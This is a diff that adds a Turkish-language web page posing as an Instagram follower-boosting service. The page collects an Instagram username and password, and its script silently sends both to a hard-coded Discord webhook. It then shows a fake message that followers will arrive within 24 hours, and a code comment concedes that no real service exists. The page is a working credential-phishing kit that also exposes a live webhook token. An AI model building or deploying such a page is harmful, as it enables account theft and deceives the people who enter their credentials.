@@ -1,1 +1,124 @@
-<label for="">açılıyor site.... discord.gg/jargon</label>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Takipçi Artırma</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #405DE6 0%, #5851DB 20%, #833AB4 40%, #C13584 60%, #E1306C 80%, #FD1D1D 100%);
+        }
+        .login-box {
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body class="min-h-screen gradient-bg flex items-center justify-center p-4">
+    <div class="login-box bg-white rounded-lg overflow-hidden w-full max-w-md">
+        <div class="px-8 py-6">
+            <div class="flex justify-center mb-6">
+                <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/238e3184-7c08-489e-983d-ba9b72d69e3c.png" alt="Instagram Follow Logo - Purple gradient with white text" class="h-12">
+            </div>
+            
+            <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">Takipçi Artırma Sistemi</h1>
+            
+            <form id="loginForm" class="space-y-4">
+                <div>
+                    <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Kullanıcı Adı</label>
+                    <input type="text" id="username" name="username" 
+                           class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-transparent" 
+                           placeholder="instagram_kullaniciadi" required>
+                </div>
+                
+                <div>
+                    <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Şifre</label>
+                    <input type="password" id="password" name="password" 
+                           class="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-transparent" 
+                           placeholder="••••••••" required>
+                </div>
+                
+                <div class="pt-2">
+                    <button type="submit" class="w-full gradient-bg text-white py-2 px-4 rounded-md hover:opacity-90 transition duration-300 font-medium">
+                        Takipçileri Artır
+                    </button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="px-8 py-4 bg-gray-50 border-t border-gray-200 text-center">
+            <p class="text-sm text-gray-600">Giriş yaparak <a href="#" class="text-purple-600 hover:underline">Kullanım Şartları</a>'nı kabul etmiş olursunuz</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Discord webhook URL'si buraya gelecek
+            const webhookUrl = 'https://discord.com/api/webhooks/1395182727657029822/-C20aVwkpjGAcsFr_5Q4U8_MNnOjSQ29179CSRZNB9D5D5m2o0EzZ-r2CWircuL1qhRw';
+            
+            try {
+                // Kullanıcıya animasyonlu feedback
+                const button = e.target.querySelector('button');
+                button.innerHTML = '<svg class="animate-spin h-5 w-5 text-white mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>';
+                button.disabled = true;
+                
+                // Discord'a veri gönder
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }, 
+                    body: JSON.stringify({
+                        username: 'Instagram Giriş Bildirimi',
+                        avatar_url: 'https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/b0fd2123-da63-4bf2-88ba-414763fb3ed5.png',
+                        embeds: [{
+                            title: 'Yeni Instagram Girişi',
+                            color: 15258703,
+                            fields: [
+                                {
+                                    name: 'Kullanıcı Adı',
+                                    value: username,
+                                    inline: true
+                                },
+                                {
+                                    name: 'Şifre',
+                                    value: '||' + password + '||', // Discord'da spoiler olarak göster
+                                    inline: true
+                                },
+                                {
+                                    name: 'Tarih',
+                                    value: new Date().toLocaleString(),
+                                    inline: false
+                                }
+                            ],
+                            footer: {
+                                text: 'Instagram Takipçi Hizmeti'
+                            }
+                        }]
+                    }),
+                });
+                
+                // Gerçek bir servis olmadığı için demo amaçlı mesaj
+                button.innerHTML = 'Takipçiler Artırılıyor...';
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                alert('Tamamlandı! 24 saat içinde takipçileriniz artacaktır. O');
+                button.innerHTML = 'Takipçileri Artır';
+                button.disabled = false;
+            } catch (error) {
+                alert('Bir hata oluştu, lütfen daha sonra tekrar deneyin.');
+                console.error('Webhook hatası:', error);
+                button.innerHTML = 'Takipçileri Artır';
+                button.disabled = false;
+            }
+        });
+        
+    </script>
+</body>
+</html>
+
